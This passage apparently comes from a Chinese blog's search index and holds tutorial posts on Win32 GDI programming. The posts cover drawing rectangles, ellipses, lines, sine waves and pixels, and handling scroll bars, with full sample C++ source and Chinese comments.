&#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW , 0, 0, GetSystemMetrics(SM_CXSCREEN), GetSystemMetrics(SM_CYSCREEN), nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //画矩形 Rectangle(hdc,200,50,600,400); //画椭圆或正圆 Ellipse(hdc, 200, 50, 600, 400); //画带圆角的矩形 RoundRect(hdc, 700, 50, 1100, 400,100,100); //画弦 Chord(hdc, 450,500,800,850, 20, 600, 1200, 400); //画弧 Arc(hdc, 850, 500, 1000, 650, 20, 600, 1200, 400); //画圆饼 Pie(hdc,50,500,400,850,500,0,50,650); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"正弦波","slug":"pwcp012-正弦波","date":"2021-06-07T10:49:41.000Z","updated":"2021-06-07T11:12:28.817Z","comments":true,"path":"2021/06/07/pwcp012-正弦波/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp012-正弦波/","excerpt":"","text":"正弦波 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205// 正弦波.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"正弦波.h\"#include&lt;math.h&gt;#define MAX_LOADSTRING 100//点的数量#define NUM 1000//波的数量10#define TWOPI (10 * 3.14159265)// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; static int cxClient, cyClient; POINT apt[NUM]; switch (message) &#123; case WM_SIZE: cxClient = LOWORD(lParam); cyClient = HIWORD(lParam); break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); MoveToEx(hdc,0,cyClient / 2,NULL); LineTo(hdc,cxClient,cyClient / 2); //将正弦波点分成NUM份 for (int i = 0; i &lt; NUM; i++) &#123; apt[i].x = i * cxClient / NUM; apt[i].y = (int) cyClient/2 *(1 - sin(i * TWOPI/NUM)); &#125; //连接点 Polyline(hdc,apt,NUM); // TODO: 在此处添加使用 hdc 的任何绘图代码... EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"画直线","slug":"pwcp011-画直线","date":"2021-06-07T09:32:12.000Z","updated":"2021-06-07T09:51:03.222Z","comments":true,"path":"2021/06/07/pwcp011-画直线/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/07/pwcp011-画直线/","excerpt":"","text":"画直线 POINT坐标结构类型 12345typedef struct tagPOINT&#123; LONG x; LONG y;&#125; POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT; MoveToEx设置当前画笔位置 123456WINGDIAPI BOOL WINAPI MoveToEx(HDC hdc,int X,int Y,LPPOINT lpPoint); HDC hdc：传入参数，设备上下文句柄。 int X：传入参数：新位置的X坐标。 int Y：传入参数：新位置的Y坐标。 LPPOINT lpPoint：传出参数：一个指向POINT结构的指针，用来存放上一个点的位置，若此参数为NULL，则不保存上一个点的位置 返回值： 返回TRUE代表移动成功，FALSE代表失败，用GetLastError获得更具体的错误信息 1MoveToEx(hdc, 20, 20, NULL); LineTo从画笔当前位置画到终点位置 1WINGDIAPI BOOL WINAPI LineTo(HDChdc,intX,intY,); hdc:设备场景句柄 X:线段终点X坐标位置，采用逻辑坐标表示。这个点不会实际画出来；它不属于线段的一部份 Y:线段终点Y坐标位置，采用逻辑坐标表示。这个点不会实际画出来；它不属于线段的一部份 返回值： 返回TRUE代表移动成功，FALSE代表失败 12//从起点画到200, 20,并改变当前画笔位置LineTo(hdc, 200, 20); Polyline 从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置 1BOOL Polyline( HDChdc, CONST POINT*lppt, intcPoints) hdc ------------ Long，要在其中绘图的设备场景 lpPoint -------- POINTAPI，nCount POINTAPI结构数组中的第一个POINTAPI结构 nCount --------- Long，lpPoint数组中的点数。会从第一个点到第二个点画一条线，以次类推 返回值: bool，非零表示成功，零表示失败 123456789 POINT apt[5] = &#123; &#123;600,30&#125;, &#123;800,30&#125;, &#123;800,500&#125;, &#123;600,500&#125;, &#123;600,30&#125; &#125;;//从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置Polyline(hdc,apt,5); PolylineTo 从apt2数组中获取坐标点,画一个矩形,并改变当前画笔位置 使用目前位置作为开始点，并将目前位置设定为最后一根线的终点,根据apt的点依次画直线。设置目前位置可调用MoveToEx函数. 1BOOL PolyLineTo(HDC hdc, CONST POINT * apt, DWORD cpt); 参数： hdc:设备场景句柄 apt:nCount POINTAPI结构数组中的第一个POINTAPI结构 cpt:Point数组中的点数 123456789101112POINT apt2[5] = &#123; &#123; 900,30 &#125;, &#123; 1200,30 &#125;, &#123; 1200,500 &#125;, &#123; 900,500 &#125;, &#123; 900,30 &#125;&#125;;//设置当前画笔位置MoveToEx(hdc, apt2[0].x, apt2[0].y, NULL);//从apt2数组中获取坐标点,画一个矩形,改变当前画笔位置PolylineTo(hdc, apt2 + 1, 4); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227// 直线.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"直线.h\"#define MAX_LOADSTRING 100// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_MY); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; //POINT 坐标结构类型 /* typedef struct tagPOINT &#123; LONG x; LONG y; &#125; POINT, *PPOINT, NEAR *NPPOINT, FAR *LPPOINT; */ //第二个矩形 POINT apt[5] = &#123; &#123;600,30&#125;, &#123;800,30&#125;, &#123;800,500&#125;, &#123;600,500&#125;, &#123;600,30&#125; &#125;; //第三个矩形 POINT apt2[5] = &#123; &#123; 900,30 &#125;, &#123; 1200,30 &#125;, &#123; 1200,500 &#125;, &#123; 900,500 &#125;, &#123; 900,30 &#125; &#125;; switch (message) &#123; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; HDC hdc = BeginPaint(hWnd, &amp;ps); // TODO: 在此处添加使用 hdc 的任何绘图代码... //设置起点位置 MoveToEx(hdc, 20, 20, NULL); //从起点画到200, 20,并改变当前画笔位置 LineTo(hdc, 200, 20); //从当前画笔位置,画到200, 500 LineTo(hdc, 200, 500); LineTo(hdc, 20, 500); LineTo(hdc, 20, 20); //从apt数组中获取坐标点,画一个矩形,不改变当前画笔位置 Polyline(hdc,apt,5); //设置当前画笔位置 MoveToEx(hdc, apt2[0].x, apt2[0].y, NULL); //从apt2数组中获取坐标点,画一个矩形,改变当前画笔位置 PolylineTo(hdc, apt2 + 1, 4); EndPaint(hWnd, &amp;ps); &#125; break; case WM_DESTROY: PostQuitMessage(0); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; return 0;&#125;// “关于”框的消息处理程序。INT_PTR CALLBACK About(HWND hDlg, UINT message, WPARAM wParam, LPARAM lParam)&#123; UNREFERENCED_PARAMETER(lParam); switch (message) &#123; case WM_INITDIALOG: return (INT_PTR)TRUE; case WM_COMMAND: if (LOWORD(wParam) == IDOK || LOWORD(wParam) == IDCANCEL) &#123; EndDialog(hDlg, LOWORD(wParam)); return (INT_PTR)TRUE; &#125; break; &#125; return (INT_PTR)FALSE;&#125;","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"设定像素点","slug":"pwcp010-设定像素点","date":"2021-06-05T05:59:49.000Z","updated":"2021-06-05T06:11:47.909Z","comments":true,"path":"2021/06/05/pwcp010-设定像素点/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/05/pwcp010-设定像素点/","excerpt":"","text":"COLORREF 颜色类型 实际上是 unsigned long RGB宏 RGB(红,绿,蓝); SetPixel 指定坐标处的像素设为指定的颜色 1COLORREF SetPixel(HDC hdc, int X, int Y, COLORREF crColor)； 1SetPixel(hdc,i,j,color); GetPixel 1COLORREF GetPixel(HDC hdc, int nXPos, int nYPos) hdc：设备环境句柄。 nXPos：指定要检查的像素点的逻辑X轴坐标。 nYPos：指定要检查的像素点的逻辑Y轴坐标。 1color = GetPixel(hdc,200,200); GetRValue宏 获取红色值 1red = GetRValue(color); GetGValue宏 获取绿色值 1green = GetGValue(color); GetBValue宏 获取蓝色值 1blue = GetBValue(color);","categories":[{"name":"windows程序设计2","slug":"windows程序设计2","permalink":"https://xiaowuyoucy.github.io/categories/windows程序设计2/"}],"tags":[]},{"title":"新滚动条","slug":"pwcp009-新滚动条","date":"2021-06-02T08:05:19.000Z","updated":"2021-06-05T06:11:44.691Z","comments":true,"path":"2021/06/02/pwcp009-新滚动条/","link":"","permalink":"https://xiaowuyoucy.github.io/2021/06/02/pwcp009-新滚动条/","excerpt":"","text":"新滚动条 SCROLLINFO 12345678910typedef struct tagSCROLLINFO&#123;UINT cbSize ; // set to sizeof (SCROLLINFO)UINT fMask ; // values to set or getint nMin; // 滚动条最小值int nMax; // 滚动条最大值UINT nPage ; // 一页大小int nPos ; int nTrackPos ; // 当前滑块位置&#125;SCROLLINFO,*LPSCROLLINFO; SetScrollInfo 设置滚动条参数 1int setscrollinfo(hwnd hwnd,int fnbar,lpscrollinfo lpsi,bool fredraw); 参数： hWnd：滚动条控件或带标准滚动条的窗体句柄，由fnBar参数决定。 fnBar：指定被设定参数的滚动条的类型。这个参数可以是下面值，含义如下： SB_CTL：设置滚动条控件。而参数hwnd必须是滚动条控件的句柄。 SB_HORZ：设置所给定的窗体上标准水平滚动条参数。 SB_VERT：设置所给定的窗体上标准垂直滚动条参数。 lpsi：指向SCROLLINFO结构。在调用SetScrollInfo之前，设置SCROLLINFO结构中cbSize成员以标识结构大小，设置成员fMask以说明待设置的滚动条参数，并且在适当的成员中制定新的参数值。成员fMask可以为下面所列复合值，含义如下： SIF_DISABLENOSCROLL：如果滚动条的新参数使其为没必要，则使滚动条无效而不再移动它。 SIF_PAGE：设置滚动页码值到由Ipsi指向的SCROLLINFO结构的nPage成员中。 SIF_POS：设置滚动位置值到由lpsi指向的SCROLLINFO结构的nPos成员中。 SIF_RANGE：设置滚动范围值到由lpsl指向的SCROLLINFO结构的nMin和nMax成员中。 fRedraw：指定滚动条是否重画以反映滚动条的变化。如果这个参数为TRUE，滚动条将被重画，否则不被重画。 1234//设置SIF_POSsi.fMask = SIF_POS;//设置滑块位置SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); GetScrollInfo 获取滚动条的参数 1BOOL GetScrollInfo( HWND hWnd, int fnBar, LPSCROLLINFO lpsi ); 参数： hWnd：滚动条控制或有标准滚动条的窗体句柄，由fnBar参数确定。 fnBar：指定待找回滚动条参数的类型，此参数可以为如下值，其值含义： SB_CTL：找回滚动条控制参数。其中参数hwnd一定是处理滚动条控制的句柄。 SB_HORZ：找回所指定窗体的标准水平滚动条参数。 SB_VERT：找回所指定窗体的标准垂直滚动条参数。 lpsi：指向SCROLLINFO结构。 1GetScrollInfo(hWnd, SB_VERT, &amp;si); ScrollWindow 函数滚动所指定的窗口客户区域内容。 1BOOL ScrollWindow(HWND hWnd, int XAmount, int YAmount, CONST RECT *IpRect, CONST RECT *lpClipRect); hWnd [in]客户区域将被滚动的窗口的句柄。 XAmount [in]指定水平滚动的距离，以设备单位计。如果窗口类风格为CS_OWNDC或CS_CLASSDC，则此参数则使用逻辑单位而非设备单位。当向左滚动窗体内容时，参数值必须为负。 YAmount [in]指定垂直滚动的距离，以设备单位计。如果窗口类风格为CS_OWNDC或CS_CLASSDC，则此参数则使用逻辑单位而非设备单位。当向上滚动窗体内容时，参数值必须为负。 lpRect [in]指向RECT结构的指针，该结构指定了将要滚动的客户区范围。若此参数为NULL，则整个客户区域将被滚动。 lpClipRect [in]指向RECT结构的指针，该结构指定了要滚动的裁剪区域。只有这个矩形中的位才会被滚动。在矩形之外的位不会被影响，即使它们是在lpRect矩形之内。(见代码&quot;测试一&quot;)假如lpClipRect为NULL，则不会在滚动矩形上进行裁剪。 1ScrollWindow(hWnd, 0, cyChar * (iVertPos - si.nPos),NULL,NULL); 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220221222223224225226227228229230231232233234235236237238239240241242243244245246247248249250251252253254255256257258259260261262263264265266267268269270271272273274275276277278279280281282283284285286287288289290291292293294295296297298299300301302303304305306307308// 滚动条2.cpp : 定义应用程序的入口点。//#include \"stdafx.h\"#include \"滚动条2.h\"#define MAX_LOADSTRING 100#define MAX_LINE 1024// 全局变量: HINSTANCE hInst; // 当前实例WCHAR szTitle[MAX_LOADSTRING]; // 标题栏文本WCHAR szWindowClass[MAX_LOADSTRING]; // 主窗口类名// 此代码模块中包含的函数的前向声明: ATOM MyRegisterClass(HINSTANCE hInstance);BOOL InitInstance(HINSTANCE, int);LRESULT CALLBACK WndProc(HWND, UINT, WPARAM, LPARAM);INT_PTR CALLBACK About(HWND, UINT, WPARAM, LPARAM);int APIENTRY wWinMain(_In_ HINSTANCE hInstance, _In_opt_ HINSTANCE hPrevInstance, _In_ LPWSTR lpCmdLine, _In_ int nCmdShow)&#123; UNREFERENCED_PARAMETER(hPrevInstance); UNREFERENCED_PARAMETER(lpCmdLine); // TODO: 在此放置代码。 // 初始化全局字符串 LoadStringW(hInstance, IDS_APP_TITLE, szTitle, MAX_LOADSTRING); LoadStringW(hInstance, IDC_MY2, szWindowClass, MAX_LOADSTRING); MyRegisterClass(hInstance); // 执行应用程序初始化: if (!InitInstance (hInstance, nCmdShow)) &#123; return FALSE; &#125; HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_MY2)); MSG msg; // 主消息循环: while (GetMessage(&amp;msg, nullptr, 0, 0)) &#123; if (!TranslateAccelerator(msg.hwnd, hAccelTable, &amp;msg)) &#123; TranslateMessage(&amp;msg); DispatchMessage(&amp;msg); &#125; &#125; return (int) msg.wParam;&#125;//// 函数: MyRegisterClass()//// 目的: 注册窗口类。//ATOM MyRegisterClass(HINSTANCE hInstance)&#123; WNDCLASSEXW wcex; wcex.cbSize = sizeof(WNDCLASSEX); wcex.style = CS_HREDRAW | CS_VREDRAW; wcex.lpfnWndProc = WndProc; wcex.cbClsExtra = 0; wcex.cbWndExtra = 0; wcex.hInstance = hInstance; wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_MY2)); wcex.hCursor = LoadCursor(nullptr, IDC_ARROW); wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW+1); wcex.lpszMenuName = NULL;// MAKEINTRESOURCEW(IDC_MY2); wcex.lpszClassName = szWindowClass; wcex.hIconSm = LoadIcon(wcex.hInstance, MAKEINTRESOURCE(IDI_SMALL)); return RegisterClassExW(&amp;wcex);&#125;//// 函数: InitInstance(HINSTANCE, int)//// 目的: 保存实例句柄并创建主窗口//// 注释: //// 在此函数中，我们在全局变量中保存实例句柄并// 创建和显示主程序窗口。//BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)&#123; hInst = hInstance; // 将实例句柄存储在全局变量中 HWND hWnd = CreateWindowW(szWindowClass, szTitle, WS_OVERLAPPEDWINDOW | WS_VSCROLL, CW_USEDEFAULT, 0, CW_USEDEFAULT, 0, nullptr, nullptr, hInstance, nullptr); if (!hWnd) &#123; return FALSE; &#125; ShowWindow(hWnd, nCmdShow); UpdateWindow(hWnd); return TRUE;&#125;//// 函数: WndProc(HWND, UINT, WPARAM, LPARAM)//// 目的: 处理主窗口的消息。//// WM_COMMAND - 处理应用程序菜单// WM_PAINT - 绘制主窗口// WM_DESTROY - 发送退出消息并返回////LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)&#123; SCROLLINFO si; static TEXTMETRIC tm; //获取字体信息 static int cxChar; //字体宽度 static int cyChar; //字体高度 HDC hdc; static int iVscrollPos; //当前滑块位置 static TCHAR szBuffer[1024][1024] = &#123; 0 &#125;; static int cyClient; //当前客户区高度大小 static int cxClient; //当前客户区宽度大小 static int iVertPos; static int iPaintBeg; static int iPaintEnd; switch (message) &#123; case WM_SIZE: //获取客户区的高度 cyClient = HIWORD(lParam); //获取客户区的宽度 cxClient = LOWORD(lParam); //初始化si结构大小 si.cbSize = sizeof(si); //设置可用标志 //SIF_RANGE:使用nMin和nMax成员 //SIF_PAGE:使用nPage成员 si.fMask = SIF_RANGE | SIF_PAGE; //设置一页大小 si.nPage = cyClient / cyChar; //设置滚动条最小值 si.nMin = 0; //设置滚动条最大值 si.nMax = MAX_LINE - 1; //设置滚动条参数 SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); //窗口设置为失效 InvalidateRect(hWnd, NULL, TRUE); //更新窗口 UpdateWindow(hWnd); break; case WM_VSCROLL: si.cbSize = sizeof(si); //SIF_ALL:所有成员可用 si.fMask = SIF_ALL; //获取滚动条信息 GetScrollInfo(hWnd,SB_VERT,&amp;si); iVertPos = si.nPos; //获取滚动条操作的消息 switch (LOWORD(wParam)) &#123; //向上滚动一行 case SB_LINEUP: si.nPos -= 1; break; //向下滚动一行 case SB_LINEDOWN: si.nPos += 1; break; //向下滚动一页 case SB_PAGEDOWN: si.nPos += si.nPage; break; //向上滚动一页 case SB_PAGEUP: si.nPos -= si.nPage; break; //拖动滑块时 case SB_THUMBTRACK: si.nPos = si.nTrackPos; break; &#125; //设置SIF_POS si.fMask = SIF_POS; //设置滑块位置 SetScrollInfo(hWnd,SB_VERT,&amp;si,TRUE); //获取滚动条信息 GetScrollInfo(hWnd, SB_VERT, &amp;si); //如果滑块位置不等于当前滑块位置 if (si.nPos != iVertPos) &#123; //滚动所指定的窗口客户区域内容 ScrollWindow(hWnd, 0, cyChar * (iVertPos - si.nPos),NULL,NULL); UpdateWindow(hWnd); &#125; break; case WM_CREATE: hdc = GetDC(hWnd); GetTextMetrics(hdc, &amp;tm); cxChar = tm.tmAveCharWidth; cyChar = tm.tmHeight + tm.tmExternalLeading; ReleaseDC(hWnd, hdc); for (int i = 0; i &lt; MAX_LINE; i++) &#123; _sntprintf(szBuffer[i], 1024, TEXT(\"Hello %d \"), i + 1); &#125; break; case WM_COMMAND: &#123; int wmId = LOWORD(wParam); // 分析菜单选择: switch (wmId) &#123; case IDM_ABOUT: DialogBox(hInst, MAKEINTRESOURCE(IDD_ABOUTBOX), hWnd, About); break; case IDM_EXIT: DestroyWindow(hWnd); break; default: return DefWindowProc(hWnd, message, wParam, lParam); &#125; &#125; break; case WM_PAINT: &#123; PAINTSTRUCT ps; int x; int y; HDC hdc = BeginPaint(hWnd, &amp;ps); si.cbSize = sizeof si; si.fMask = SIF_ALL; GetScrollInfo(hWnd,SB_VERT,&amp;si); iVertPos = si.nPos; //获取滚动条开始打印的位置 //ps.rcPaint.top 无效矩形的顶位置 iPaintBeg = max(0, iVertPos + ps.rcPaint.top / cyChar); 